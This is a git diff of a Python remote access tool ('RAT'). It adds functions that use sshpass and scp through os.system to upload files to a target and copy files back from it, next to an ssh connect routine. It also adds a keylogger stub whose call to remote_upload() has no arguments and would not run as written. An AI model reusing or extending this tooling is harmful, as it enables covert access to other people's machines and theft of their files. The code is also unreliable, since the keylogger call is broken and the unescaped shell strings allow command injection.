@@ -5,7 +5,6 @@
 import os
 import sys
 import getpass
-from modules import *
 
 # variables
 banner = """
@@ -43,6 +42,8 @@ username = getpass.getuser()
 header = f"[~] {username}@rat $ "
 remote_path = "raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/tree/main/"
 
+local_path = f"/home/{username}/RAT" if username != "root" else "/root/.RAT"
+
 # read config file
 def read_config(config_file):
     configuration = {}
@@ -64,12 +65,21 @@ def clear():
 # terminates program
 def exit():
     print("\n[*] Exiting...")
-    sys.exit()
+    sys.exit() 
 
 # connects rat to target
 def connect(address, password):
     # remotely connect
     os.system(f"sshpass -p \"{password}\" ssh RAT@{address}")
+
+def remote_upload(address, password, upload, path):
+    os.system(f"sshpass -p \"{password}\" scp {upload} RAT@{address}:{path}")
+
+def remote_download(address, password, download, path):
+    os.system(f"sshpass -p \"{password}\" scp -r RAT@{address}:{path} {local_path}")
+
+def keylogger(address, password):
+    remote_upload()
 
 # update RAT
 def update():
